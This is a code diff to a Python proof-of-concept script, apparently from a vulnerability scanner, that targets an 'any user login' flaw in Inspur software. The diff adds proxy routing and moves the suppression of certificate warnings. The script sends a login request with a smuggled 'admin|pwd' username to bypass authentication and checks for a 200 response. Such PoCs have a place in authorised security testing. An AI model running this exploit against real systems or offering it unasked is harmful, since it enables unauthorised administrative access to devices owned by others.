@@ -3,9 +3,11 @@
 
 import sys
 import requests
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='Inspur_Any_user_login'
@@ -20,8 +22,7 @@ def poc(target):
     headers = {"User-Agent":ua}
     data = "op=login&username=admin|pwd&password=任意"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.post(url,data=data,headers=headers,verify=False,timeout=3)
+        r = requests.post(url,data=data,headers=headers,verify=False,timeout=3,proxies=proxies)
         if r.status_code == 200:
             result['target'] = target
             result['poc'] = NAME
